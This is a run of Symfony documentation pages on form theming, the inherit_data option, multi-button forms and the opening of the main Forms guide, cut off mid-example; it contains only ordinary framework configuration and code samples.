* `bootstrap_4_layout.html.twig`_, same as ``bootstrap_3_layout.html.twig``, but
  updated for `Bootstrap 4 CSS framework`_ styles.
* `bootstrap_4_horizontal_layout.html.twig`_, same as
  ``bootstrap_3_horizontal_layout.html.twig`` but updated for Bootstrap 4 styles.
* `bootstrap_5_layout.html.twig`_, same as ``bootstrap_4_layout.html.twig``, but
  updated for `Bootstrap 5 CSS framework`_ styles.
* `bootstrap_5_horizontal_layout.html.twig`_, same as
  ``bootstrap_4_horizontal_layout.html.twig`` but updated for Bootstrap 5 styles.
* `foundation_5_layout.html.twig`_, wraps each form field inside a ``<div>``
  element with the appropriate CSS classes to apply the default styles of the
  version 5 of `Foundation CSS framework`_.
* `foundation_6_layout.html.twig`_, wraps each form field inside a ``<div>``
  element with the appropriate CSS classes to apply the default styles of the
  version 6 of `Foundation CSS framework`_.
* `tailwind_2_layout.html.twig`_, wraps each form field inside a ``<div>``
  element with the absolute minimum styles to make them usable. It is based on the
  `Tailwind CSS form plugin`_.

.. tip::

    Read the articles about :doc:`Bootstrap 4 Symfony form theme </form/bootstrap4>` and :doc:`Bootstrap 5 Symfony form theme </form/bootstrap5>`
    to learn more about them.

.. _forms-theming-global:
.. _forms-theming-twig:

Applying Themes to all Forms
----------------------------

Symfony forms use by default the ``form_div_layout.html.twig`` theme. If you
want to use another theme for all the forms of your app, configure it in the
``twig.form_themes`` option:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/twig.yaml
        twig:
            form_themes: ['bootstrap_5_horizontal_layout.html.twig']
            # ...

    .. code-block:: xml

        <!-- config/packages/twig.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:twig="http://symfony.com/schema/dic/twig"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/twig https://symfony.com/schema/dic/twig/twig-1.0.xsd">

            <twig:config>
                <twig:form-theme>bootstrap_5_horizontal_layout.html.twig</twig:form-theme>
                <!-- ... -->
            </twig:config>
        </container>

    .. code-block:: php

        // config/packages/twig.php
        use Symfony\Config\TwigConfig;

        return static function (TwigConfig $twig): void {
            $twig->formThemes([
                'bootstrap_5_horizontal_layout.html.twig',
            ]);

            // ...
        };

You can pass multiple themes to this option because sometimes form themes only
redefine a few elements. This way, if some theme doesn't override some element,
Symfony looks up in the other themes.

The order of the themes in the ``twig.form_themes`` option is important. Each
theme overrides all the previous themes, so you must put the most important
themes at the end of the list.

Applying Themes to Single Forms
-------------------------------

Although most of the times you'll apply form themes globally, you may need to
apply a theme only to some specific form. You can do that with the
:ref:`form_theme Twig tag <reference-twig-tag-form-theme>`:

.. code-block:: twig

    {# this form theme will be applied only to the form of this template #}
    {% form_theme form 'foundation_5_layout.html.twig' %}

    {{ form_start(form) }}
        {# ... #}
    {{ form_end(form) }}

The first argument of the ``form_theme`` tag (``form`` in this example) is the
name of the variable that stores the form view object. The second argument is
the path of the Twig template that defines the form theme.

Applying Multiple Themes to Single Forms
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

A form can also be customized by applying several themes. To do this, pass the
path of all the Twig templates as an array using the ``with`` keyword (their
order is important, because each theme overrides all the previous ones):

.. code-block:: twig

    {# apply multiple form themes but only to the form of this template #}
    {% form_theme form with [
        'foundation_5_layout.html.twig',
        'form/my_custom_theme.html.twig'
    ] %}

    {# ... #}

Applying Different Themes to Child Forms
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

You can also apply a form theme to a specific child of your form:

.. code-block:: twig

    {% form_theme form.a_child_form 'form/my_custom_theme.html.twig' %}

This is useful when you want to have a custom theme for a nested form that's
different from the one of your main form. Specify both your themes:

.. code-block:: twig

    {% form_theme form 'form/my_custom_theme.html.twig' %}
    {% form_theme form.a_child_form 'form/my_other_theme.html.twig' %}

.. _disabling-global-themes-for-single-forms:

Disabling Global Themes for Single Forms
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Global form themes defined in the app are always applied to all forms, even
those which use the ``form_theme`` tag to apply their own themes. You may want
to disable this for example when creating an admin interface for a bundle which
can be installed on different Symfony applications (and so you can't control what
themes are enabled globally). To do that, add the ``only`` keyword after the list
of form themes:

.. code-block:: twig

    {% form_theme form with ['foundation_5_layout.html.twig'] only %}

    {# ... #}

.. caution::

    When using the ``only`` keyword, none of Symfony's built-in form themes
    (``form_div_layout.html.twig``, etc.) will be applied. In order to render
    your forms correctly, you need to either provide a fully-featured form theme
    yourself, or extend one of the built-in form themes with Twig's ``use``
    keyword instead of ``extends`` to re-use the original theme contents.

    .. code-block:: twig

        {# templates/form/common.html.twig #}
        {% use "form_div_layout.html.twig" %}

        {# ... #}

.. _create-your-own-form-theme:

Creating your Own Form Theme
----------------------------

Symfony uses Twig blocks to render each part of a form - field labels, errors,
``<input>`` text fields, ``<select>`` tags, etc. A *theme* is a Twig template
with one or more of those blocks that you want to use when rendering a form.

Consider for example a form field that represents an integer property called
``age``. If you add this to the template:

.. code-block:: twig

    {{ form_widget(form.age) }}

The generated HTML content will be something like this (it will vary depending
upon the form themes enabled in your app):

.. code-block:: html

    <input type="number" id="form_age" name="form[age]" required="required" value="33">

Symfony uses a Twig block called ``integer_widget`` to render that field. This
is because the field type is ``integer`` and you're rendering its ``widget`` (as
opposed to its ``label`` or ``errors`` or ``help``). The first step to create a
form theme is to know which Twig block to override, as explained in the
following section.

.. _form-customization-sidebar:
.. _form-fragment-naming:

Form Fragment Naming
~~~~~~~~~~~~~~~~~~~~

The naming of form fragments varies depending on your needs:

* If you want to customize **all fields of the same type** (e.g. all ``<textarea>``)
  use the ``field-type_field-part`` pattern (e.g. ``textarea_widget``).
* If you want to customize **only one specific field** (e.g. the ``<textarea>``
  used for the ``description`` field of the form that edits products) use the
  ``_field-id_field-part`` pattern (e.g. ``_product_description_widget``).

In both cases, the ``field-part`` can be any of these valid form field parts:

.. raw:: html

    <object data="../_images/form/form-field-parts.svg" type="image/svg+xml"
        alt="A wireframe showing all form field parts: form_row, form_label, form_widget, form_help and form_errors."
    ></object>

Fragment Naming for All Fields of the Same Type
...............................................

These fragment names follow the ``type_part`` pattern, where the ``type``
corresponds to the field *type* being rendered (e.g. ``textarea``, ``checkbox``,
``date``, etc) and the ``part`` corresponds to *what* is being rendered (e.g.
``label``, ``widget``, etc.)

A few examples of fragment names are:

* ``form_row`` - used by :ref:`form_row() <reference-forms-twig-row>` to render
  most fields;
* ``textarea_widget`` - used by :ref:`form_widget() <reference-forms-twig-widget>`
  to render a ``textarea`` field type;
* ``form_errors`` - used by :ref:`form_errors() <reference-forms-twig-errors>`
  to render errors for a field;

Fragment Naming for Individual Fields
.....................................

These fragment names follow the ``_id_part`` pattern, where the ``id``
corresponds to the field ``id`` attribute (e.g. ``product_description``,
``user_age``, etc) and the ``part`` corresponds to *what* is being rendered
(e.g. ``label``, ``widget``, etc.)

The ``id`` attribute contains both the form name and the field name (e.g.
``product_price``). The form name can be set manually or generated automatically
based on your form type name (e.g. ``ProductType`` equates to ``product``). If
you're not sure what your form name is, look at the HTML code rendered for your
form. You can also define this value explicitly with the ``block_name`` option::

    use Symfony\Component\Form\Extension\Core\Type\TextType;
    use Symfony\Component\Form\FormBuilderInterface;

    public function buildForm(FormBuilderInterface $builder, array $options): void
    {
        // ...

        $builder->add('name', TextType::class, [
            'block_name' => 'custom_name',
        ]);
    }

In this example, the fragment name will be ``_product_custom_name_widget``
instead of the default ``_product_name_widget``.

.. _form-fragment-custom-naming:

Custom Fragment Naming for Individual Fields
............................................

The ``block_prefix`` option allows form fields to define their own custom
fragment name. This is mostly useful to customize some instances of the same
field without having to :doc:`create a custom form type </form/create_custom_field_type>`::

    use Symfony\Component\Form\Extension\Core\Type\TextType;
    use Symfony\Component\Form\FormBuilderInterface;

    public function buildForm(FormBuilderInterface $builder, array $options): void
    {
        $builder->add('name', TextType::class, [
            'block_prefix' => 'wrapped_text',
        ]);
    }

Now you can use ``wrapped_text_row``, ``wrapped_text_widget``, etc. as the block
names.

.. _form-custom-prototype:

Fragment Naming for Collections
...............................

When using a :doc:`collection of forms </form/form_collections>`, you have
several ways of customizing the collection and each of its entries. First,
use the following blocks to customize each part of all form collections:

.. code-block:: twig

    {% block collection_row %} ... {% endblock %}
    {% block collection_label %} ... {% endblock %}
    {% block collection_widget %} ... {% endblock %}
    {% block collection_help %} ... {% endblock %}
    {% block collection_errors %} ... {% endblock %}

You can also customize each entry of all collections with the following blocks:

.. code-block:: twig

    {% block collection_entry_row %} ... {% endblock %}
    {% block collection_entry_label %} ... {% endblock %}
    {% block collection_entry_widget %} ... {% endblock %}
    {% block collection_entry_help %} ... {% endblock %}
    {% block collection_entry_errors %} ... {% endblock %}

Finally, you can customize specific form collections instead of all of them.
For example, consider the following complex example where a ``TaskManagerType``
has a collection of ``TaskListType`` which in turn has a collection of
``TaskType``::

    class TaskManagerType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options = []): void
        {
            // ...
            $builder->add('taskLists', CollectionType::class, [
                'entry_type' => TaskListType::class,
                'block_name' => 'task_lists',
            ]);
        }
    }

    class TaskListType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options = []): void
        {
            // ...
            $builder->add('tasks', CollectionType::class, [
                'entry_type' => TaskType::class,
            ]);
        }
    }

    class TaskType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options = []): void
        {
            $builder->add('name');
            // ...
        }
    }

Then you get all the following customizable blocks (where ``*`` can be replaced
by ``row``, ``widget``, ``label``, or ``help``):

.. code-block:: twig

    {% block _task_manager_task_lists_* %}
        {# the collection field of TaskManager #}
    {% endblock %}

    {% block _task_manager_task_lists_entry_* %}
        {# the inner TaskListType #}
    {% endblock %}

    {% block _task_manager_task_lists_entry_tasks_* %}
        {# the collection field of TaskListType #}
    {% endblock %}

    {% block _task_manager_task_lists_entry_tasks_entry_* %}
        {# the inner TaskType #}
    {% endblock %}

    {% block _task_manager_task_lists_entry_tasks_entry_name_* %}
        {# the field of TaskType #}
    {% endblock %}

Template Fragment Inheritance
.............................

Each field type has a *parent* type (e.g. the parent type of ``textarea`` is
``text``, and the parent type of ``text`` is ``form``) and Symfony uses the
fragment for the parent type if the base fragment doesn't exist.

When Symfony renders for example the errors for a textarea type, it looks first
for a ``textarea_errors`` fragment before falling back to the ``text_errors``
and ``form_errors`` fragments.

.. tip::

    The "parent" type of each field type is available in the
    :doc:`form type reference </reference/forms/types>` for each field type.

Creating a Form Theme in the same Template as the Form
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This is recommended when doing customizations specific to a single form in your
app, such as changing all ``<textarea>`` elements of a form or customizing a
very special form field which will be handled with JavaScript.

You only need to add the special ``{% form_theme form _self %}`` tag to the same
template where the form is rendered. This causes Twig to look inside the template
for any overridden form blocks:

.. code-block:: html+twig

    {% extends 'base.html.twig' %}

    {% form_theme form _self %}

    {# this overrides the widget of any field of type integer, but only in the
       forms rendered inside this template #}
    {% block integer_widget %}
        <div class="...">
            {# ... render the HTML element to display this field ... #}
        </div>
    {% endblock %}

    {# this overrides the entire row of the field whose "id" = "product_stock" (and whose
       "name" = "product[stock]") but only in the forms rendered inside this template #}
    {% block _product_stock_row %}
        <div class="..." id="...">
            {# ... render the entire field contents, including its errors ... #}
        </div>
    {% endblock %}

    {# ... render the form ... #}

The main disadvantage of this method is that it only works if your template
extends another (``'base.html.twig'`` in the previous example). If your template
does not, you must point ``form_theme`` to a separate template, as explained in
the next section.

Another disadvantage is that the customized form blocks can't be reused when
rendering other forms in other templates. If that's what you need, create a form
theme in a separate template as explained in the next section.

Creating a Form Theme in a Separate Template
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This is recommended when creating form themes that are used in your entire app
or even reused in different Symfony applications. You only need to create a Twig
template somewhere and follow the :ref:`form fragment naming <form-fragment-naming>`
rules to know which Twig blocks to define.

For example, if your form theme is simple and you only want to override the
``<input type="integer">`` elements, create this template:

.. code-block:: twig

    {# templates/form/my_theme.html.twig #}
    {% block integer_widget %}

        {# ... add all the HTML, CSS and JavaScript needed to render this field #}

    {% endblock %}

Now you need to tell Symfony to use this form theme instead of (or in addition
to) the default theme. As explained in the previous sections of this article, if
you want to apply the theme globally to all forms, define the
``twig.form_themes`` option:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/twig.yaml
        twig:
            form_themes: ['form/my_theme.html.twig']
            # ...

    .. code-block:: xml

        <!-- config/packages/twig.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:twig="http://symfony.com/schema/dic/twig"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/twig https://symfony.com/schema/dic/twig/twig-1.0.xsd">

            <twig:config>
                <twig:form-theme>form/my_theme.html.twig</twig:form-theme>
                <!-- ... -->
            </twig:config>
        </container>

    .. code-block:: php

        // config/packages/twig.php
        use Symfony\Config\TwigConfig;

        return static function (TwigConfig $twig): void {
            $twig->formThemes([
                'form/my_theme.html.twig',
            ]);

            // ...
        };

If you only want to apply it to some specific forms, use the ``form_theme`` tag:

.. code-block:: twig

    {% form_theme form 'form/my_theme.html.twig' %}

    {{ form_start(form) }}
        {# ... #}
    {{ form_end(form) }}

.. _referencing-base-form-blocks-twig-specific:

Reusing Parts of a Built-In Form Theme
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Creating a complete form theme takes a lot of work because there are too many
different form field types. Instead of defining all those Twig blocks, you can
define only the blocks you are interested in and then configure multiple form
themes in your app or template. This works because when rendering a block which
is not overridden in your custom theme, Symfony falls back to the other themes.

Another solution is to make your form theme template extend from one of the
built-in themes using the `Twig "use" tag`_ instead of the ``extends`` tag so
you can inherit all its blocks (if you are unsure, extend from the default
``form_div_layout.html.twig`` theme):

.. code-block:: twig

    {# templates/form/my_theme.html.twig #}
    {% use 'form_div_layout.html.twig' %}

    {# ... override only the blocks you are interested in #}

Finally, you can also use the `Twig parent() function`_ to reuse the original
content of the built-in theme. This is useful when you only want to make minor
changes, such as wrapping the generated HTML with some element:

.. code-block:: html+twig

    {# templates/form/my_theme.html.twig #}
    {% use 'form_div_layout.html.twig' %}

    {% block integer_widget %}
        <div class="some-custom-class">
            {{ parent() }}
        </div>
    {% endblock %}

This technique also works when defining the form theme in the same template that
renders the form. However, importing the blocks from the built-in themes is a
bit more complicated:

.. code-block:: html+twig

    {% form_theme form _self %}

    {# import a block from the built-in theme and rename it so it doesn't
       conflict with the same block defined in this template #}
    {% use 'form_div_layout.html.twig' with integer_widget as base_integer_widget %}

    {% block integer_widget %}
        <div class="some-custom-class">
            {{ block('base_integer_widget') }}
        </div>
    {% endblock %}

    {# ... render the form ... #}

Customizing the Form Validation Errors
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you define :doc:`validation rules </validation>` for your objects, you'll see
some validation error messages when the submitted data is not valid. These
messages are displayed with the :ref:`form_errors() <reference-forms-twig-errors>`
function and can be customized with the ``form_errors`` Twig block in any form
theme, as explained in the previous sections.

An important thing to consider is that certain errors are associated to the
entire form instead of a specific field. In order to differentiate between
global and local errors, use one of the
:ref:`variables available in forms <reference-form-twig-variables>` called
``compound``. If it is ``true``, it means that what's being currently rendered
is a collection of fields (e.g. a whole form), and not just an individual field:

.. code-block:: html+twig

    {# templates/form/my_theme.html.twig #}
    {% block form_errors %}
        {% if errors|length > 0 %}
            {% if compound %}
                {# ... display the global form errors #}
                <ul>
                    {% for error in errors %}
                        <li>{{ error.message }}</li>
                    {% endfor %}
                </ul>
            {% else %}
                {# ... display the errors for a single field #}
            {% endif %}
        {% endif %}
    {% endblock form_errors %}

.. _`form_div_layout.html.twig`: https://github.com/symfony/symfony/blob/master/src/Symfony/Bridge/Twig/Resources/views/Form/form_div_layout.html.twig
.. _`form_table_layout.html.twig`: https://github.com/symfony/symfony/blob/master/src/Symfony/Bridge/Twig/Resources/views/Form/form_table_layout.html.twig
.. _`bootstrap_3_layout.html.twig`: https://github.com/symfony/symfony/blob/master/src/Symfony/Bridge/Twig/Resources/views/Form/bootstrap_3_layout.html.twig
.. _`bootstrap_3_horizontal_layout.html.twig`: https://github.com/symfony/symfony/blob/master/src/Symfony/Bridge/Twig/Resources/views/Form/bootstrap_3_horizontal_layout.html.twig
.. _`bootstrap_4_layout.html.twig`: https://github.com/symfony/symfony/blob/master/src/Symfony/Bridge/Twig/Resources/views/Form/bootstrap_4_layout.html.twig
.. _`bootstrap_4_horizontal_layout.html.twig`: https://github.com/symfony/symfony/blob/master/src/Symfony/Bridge/Twig/Resources/views/Form/bootstrap_4_horizontal_layout.html.twig
.. _`bootstrap_5_layout.html.twig`: https://github.com/symfony/symfony/blob/master/src/Symfony/Bridge/Twig/Resources/views/Form/bootstrap_5_layout.html.twig
.. _`bootstrap_5_horizontal_layout.html.twig`: https://github.com/symfony/symfony/blob/master/src/Symfony/Bridge/Twig/Resources/views/Form/bootstrap_5_horizontal_layout.html.twig
.. _`Bootstrap 3 CSS framework`: https://getbootstrap.com/docs/3.4/
.. _`Bootstrap 4 CSS framework`: https://getbootstrap.com/docs/4.6/
.. _`Bootstrap 5 CSS framework`: https://getbootstrap.com/docs/5.0/
.. _`foundation_5_layout.html.twig`: https://github.com/symfony/symfony/blob/master/src/Symfony/Bridge/Twig/Resources/views/Form/foundation_5_layout.html.twig
.. _`foundation_6_layout.html.twig`: https://github.com/symfony/symfony/blob/master/src/Symfony/Bridge/Twig/Resources/views/Form/foundation_6_layout.html.twig
.. _`Foundation CSS framework`: https://get.foundation/
.. _`tailwind_2_layout.html.twig`: https://github.com/symfony/symfony/blob/master/src/Symfony/Bridge/Twig/Resources/views/Form/tailwind_2_layout.html.twig
.. _`Tailwind CSS form plugin`: https://tailwindcss-forms.vercel.app/
.. _`Twig "use" tag`: https://twig.symfony.com/doc/3.x/tags/use.html
.. _`Twig parent() function`: https://twig.symfony.com/doc/3.x/functions/parent.html
How to Reduce Code Duplication with "inherit_data"
==================================================

The ``inherit_data`` form field option can be very useful when you have some
duplicated fields in different entities. For example, imagine you have two
entities, a ``Company`` and a ``Customer``::

    // src/Entity/Company.php
    namespace App\Entity;

    class Company
    {
        private string $name;
        private string $website;

        private string $address;
        private string $zipcode;
        private string $city;
        private string $country;
    }

.. code-block:: php

    // src/Entity/Customer.php
    namespace App\Entity;

    class Customer
    {
        private string $firstName;
        private string $lastName;

        private string  $address;
        private string $zipcode;
        private string $city;
        private string $country;
    }

As you can see, each entity shares a few of the same fields: ``address``,
``zipcode``, ``city``, ``country``.

Start with building two forms for these entities, ``CompanyType`` and ``CustomerType``::

    // src/Form/Type/CompanyType.php
    namespace App\Form\Type;

    use Symfony\Component\Form\AbstractType;
    use Symfony\Component\Form\Extension\Core\Type\TextType;
    use Symfony\Component\Form\FormBuilderInterface;

    class CompanyType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder
                ->add('name', TextType::class)
                ->add('website', TextType::class);
        }
    }

.. code-block:: php

    // src/Form/Type/CustomerType.php
    namespace App\Form\Type;

    use Symfony\Component\Form\AbstractType;
    use Symfony\Component\Form\Extension\Core\Type\TextType;
    use Symfony\Component\Form\FormBuilderInterface;

    class CustomerType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder
                ->add('firstName', TextType::class)
                ->add('lastName', TextType::class);
        }
    }

Instead of including the duplicated fields ``address``, ``zipcode``, ``city``
and ``country`` in both of these forms, create a third form called ``LocationType``
for that::

    // src/Form/Type/LocationType.php
    namespace App\Form\Type;

    use Symfony\Component\Form\AbstractType;
    use Symfony\Component\Form\Extension\Core\Type\TextareaType;
    use Symfony\Component\Form\Extension\Core\Type\TextType;
    use Symfony\Component\Form\FormBuilderInterface;
    use Symfony\Component\OptionsResolver\OptionsResolver;

    class LocationType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder
                ->add('address', TextareaType::class)
                ->add('zipcode', TextType::class)
                ->add('city', TextType::class)
                ->add('country', TextType::class);
        }

        public function configureOptions(OptionsResolver $resolver): void
        {
            $resolver->setDefaults([
                'inherit_data' => true,
            ]);
        }
    }

The location form has an interesting option set, namely ``inherit_data``. This
option lets the form inherit its data from its parent form. If embedded in
the company form, the fields of the location form will access the properties of
the ``Company`` instance. If embedded in the customer form, the fields will
access the properties of the ``Customer`` instance instead. Convenient, eh?

.. note::

    Instead of setting the ``inherit_data`` option inside ``LocationType``, you
    can also (just like with any option) pass it in the third argument of
    ``$builder->add()``.

Finally, make this work by adding the location form to your two original forms::

    // src/Form/Type/CompanyType.php
    namespace App\Form\Type;

    use App\Entity\Company;
    use Symfony\Component\Form\AbstractType;

    // ...

    class CompanyType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            // ...

            $builder->add('foo', LocationType::class, [
                'data_class' => Company::class,
            ]);
        }
    }

.. code-block:: php

    // src/Form/Type/CustomerType.php
    namespace App\Form\Type;

    use App\Entity\Customer;
    use Symfony\Component\Form\AbstractType;

    class CustomerType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            // ...

            $builder->add('bar', LocationType::class, [
                'data_class' => Customer::class,
            ]);
        }
    }

That's it! You have extracted duplicated field definitions to a separate
location form that you can reuse wherever you need it.

.. caution::

    Forms with the ``inherit_data`` option set cannot have ``*_SET_DATA`` event listeners.
How to Submit a Form with Multiple Buttons
==========================================

When your form contains more than one submit button, you will want to check
which of the buttons was clicked to adapt the program flow in your controller.
To do this, add a second button with the caption "Save and Add" to your form::

    $form = $this->createFormBuilder($task)
        ->add('task', TextType::class)
        ->add('dueDate', DateType::class)
        ->add('save', SubmitType::class, ['label' => 'Create Task'])
        ->add('saveAndAdd', SubmitType::class, ['label' => 'Save and Add'])
        ->getForm();

In your controller, use the button's
:method:`Symfony\\Component\\Form\\ClickableInterface::isClicked` method for
querying if the "Save and Add" button was clicked::

    if ($form->isSubmitted() && $form->isValid()) {
        // ... perform some action, such as saving the task to the database

        $nextAction = $form->get('saveAndAdd')->isClicked()
            ? 'task_new'
            : 'task_success';

        return $this->redirectToRoute($nextAction);
    }

Or you can get the button's name by using the
:method:`Symfony\\Component\\Form\\Form::getClickedButton` method of the form::

    if ($form->getClickedButton() && 'saveAndAdd' === $form->getClickedButton()->getName()) {
        // ...
    }

    // when using nested forms, two or more buttons can have the same name;
    // in those cases, compare the button objects instead of the button names
    if ($form->getClickedButton() === $form->get('saveAndAdd')){
        // ...
    }
Forms
=====

.. admonition:: Screencast
    :class: screencast

    Do you prefer video tutorials? Check out the `Symfony Forms screencast series`_.

Creating and processing HTML forms is hard and repetitive. You need to deal with
rendering HTML form fields, validating submitted data, mapping the form data
into objects and a lot more. Symfony includes a powerful form feature that
provides all these features and many more for truly complex scenarios.

Installation
------------

In applications using :ref:`Symfony Flex <symfony-flex>`, run this command to
install the form feature before using it:

.. code-block:: terminal

    $ composer require symfony/form

Usage
-----

The recommended workflow when working with Symfony forms is the following:

#. **Build the form** in a Symfony controller or using a dedicated form class;
#. **Render the form** in a template so the user can edit and submit it;
#. **Process the form** to validate the submitted data, transform it into PHP
   data and do something with it (e.g. persist it in a database).

Each of these steps is explained in detail in the next sections. To make
examples easier to follow, all of them assume that you're building a small Todo
list application that displays "tasks".

Users create and edit tasks using Symfony forms. Each task is an instance of the
following ``Task`` class::

    // src/Entity/Task.php
    namespace App\Entity;

    class Task
    {
        protected string $task;

        protected ?\DateTimeInterface $dueDate;

        public function getTask(): string
        {
            return $this->task;
        }

        public function setTask(string $task): void
        {
            $this->task = $task;
        }

        public function getDueDate(): ?\DateTimeInterface
        {
            return $this->dueDate;
        }

        public function setDueDate(?\DateTimeInterface $dueDate): void
        {
            $this->dueDate = $dueDate;
        }
    }

This class is a "plain-old-PHP-object" because, so far, it has nothing to do
with Symfony or any other library. It's a normal PHP object that directly solves
a problem inside *your* application (i.e. the need to represent a task in your
application). But you can also edit :doc:`Doctrine entities </doctrine>` in the
same way.

.. _form-types:

Form Types
~~~~~~~~~~

Before creating your first Symfony form, it's important to understand the
concept of "form type". In other projects, it's common to differentiate between
"forms" and "form fields". In Symfony, all of them are "form types":

* a single ``<input type="text">`` form field is a "form type" (e.g. ``TextType``);
* a group of several HTML fields used to input a postal address is a "form type"
  (e.g. ``PostalAddressType``);
* an entire ``<form>`` with multiple fields to edit a user profile is a
  "form type" (e.g. ``UserProfileType``).

This may be confusing at first, but it will feel natural to you soon enough.
Besides, it simplifies code and makes "composing" and "embedding" form fields
much easier to implement.

There are tens of :doc:`form types provided by Symfony </reference/forms/types>`
and you can also :doc:`create your own form types </form/create_custom_field_type>`.

.. tip::

    You can use the ``debug:form`` to list all the available types, type
    extensions and type guessers in your application:

    .. code-block:: terminal

        $ php bin/console debug:form

        # pass the form type FQCN to only show the options for that type, its parents and extensions.
        # For built-in types, you can pass the short classname instead of the FQCN
        $ php bin/console debug:form BirthdayType

        # pass also an option name to only display the full definition of that option
        $ php bin/console debug:form BirthdayType label_attr

Building Forms
--------------

Symfony provides a "form builder" object which allows you to describe the form
fields using a fluent interface. Later, this builder creates the actual form
object used to render and process contents.

.. _creating-forms-in-controllers:

Creating Forms in Controllers
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If your controller extends from the :ref:`AbstractController <the-base-controller-class-services>`,
use the ``createFormBuilder()`` helper::

    // src/Controller/TaskController.php
    namespace App\Controller;

    use App\Entity\Task;
    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\Form\Extension\Core\Type\DateType;
    use Symfony\Component\Form\Extension\Core\Type\SubmitType;
    use Symfony\Component\Form\Extension\Core\Type\TextType;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;

    class TaskController extends AbstractController
    {
        public function new(Request $request): Response
        {
            // creates a task object and initializes some data for this example
            $task = new Task();
            $task->setTask('Write a blog post');
            $task->setDueDate(new \DateTimeImmutable('tomorrow'));

            $form = $this->createFormBuilder($task)
                ->add('task', TextType::class)
                ->add('dueDate', DateType::class)
                ->add('save', SubmitType::class, ['label' => 'Create Task'])
                ->getForm();

            // ...
        }
    }

If your controller does not extend from ``AbstractController``, you'll need to
:ref:`fetch services in your controller <controller-accessing-services>` and
use the ``createBuilder()`` method of the ``form.factory`` service.

In this example, you've added two fields to your form - ``task`` and ``dueDate``
- corresponding to the ``task`` and ``dueDate`` properties of the ``Task``
class. You've also assigned each a :ref:`form type <form-types>` (e.g. ``TextType``
and ``DateType``), represented by its fully qualified class name. Finally, you
added a submit button with a custom label for submitting the form to the server.

.. _creating-forms-in-classes:

Creating Form Classes
~~~~~~~~~~~~~~~~~~~~~

Symfony recommends putting as little logic as possible in controllers. That's why
it's better to move complex forms to dedicated classes instead of defining them
in controller actions. Besides, forms defined in classes can be reused in
multiple actions and services.

Form classes are :ref:`form types <form-types>` that implement
:class:`Symfony\\Component\\Form\\FormTypeInterface`. However, it's better to
extend from :class:`Symfony\\Component\\Form\\AbstractType`, which already
implements the interface and provides some utilities::

    // src/Form/Type/TaskType.php
    namespace App\Form\Type;

    use Symfony\Component\Form\AbstractType;
    use Symfony\Component\Form\Extension\Core\Type\DateType;
    use Symfony\Component\Form\Extension\Core\Type\SubmitType;
    use Symfony\Component\Form\Extension\Core\Type\TextType;
    use Symfony\Component\Form\FormBuilderInterface;

    class TaskType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder
                ->add('task', TextType::class)
                ->add('dueDate', DateType::class)
                ->add('save', SubmitType::class)
            ;
        }
    }

.. tip::

    Install the `MakerBundle`_ in your project to generate form classes using
    the ``make:form`` and ``make:registration-form`` commands.

The form class contains all the directions needed to create the task form. In
controllers extending from the :ref:`AbstractController <the-base-controller-class-services>`,
use the ``createForm()`` helper (otherwise, use the ``create()`` method of the
``form.factory`` service)::

    // src/Controller/TaskController.php
    namespace App\Controller;

    use App\Form\Type\TaskType;
    // ...

    class TaskController extends AbstractController
    {
        public function new(): Response
        {
            // creates a task object and initializes some data for this example
            $task = new Task();
            $task->setTask('Write a blog post');
            $task->setDueDate(new \DateTimeImmutable('tomorrow'));

            $form = $this->createForm(TaskType::class, $task);

            // ...
        }
    }

.. _form-data-class:

Every form needs to know the name of the class that holds the underlying data
(e.g. ``App\Entity\Task``). Usually, this is just guessed based off of the
object passed to the second argument to ``createForm()`` (i.e. ``$task``).
Later, when you begin :doc:`embedding forms </form/embedded>`, this will no
longer be sufficient.

So, while not always necessary, it's generally a good idea to explicitly specify
the ``data_class`` option by adding the following to your form type class::

    // src/Form/Type/TaskType.php
    namespace App\Form\Type;

    use App\Entity\Task;
    use Symfony\Component\OptionsResolver\OptionsResolver;
    // ...

    class TaskType extends AbstractType
    {
        // ...

        public function configureOptions(OptionsResolver $resolver): void
        {
            $resolver->setDefaults([
                'data_class' => Task::class,
            ]);
        }
    }

.. _rendering-forms:

Rendering Forms
---------------

Now that the form has been created, the next step is to render it::

    // src/Controller/TaskController.php
    namespace App\Controller;

    use App\Entity\Task;
    use App\Form\Type\TaskType;
    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;

    class TaskController extends AbstractController
    {
        public function new(Request $request): Response
        {
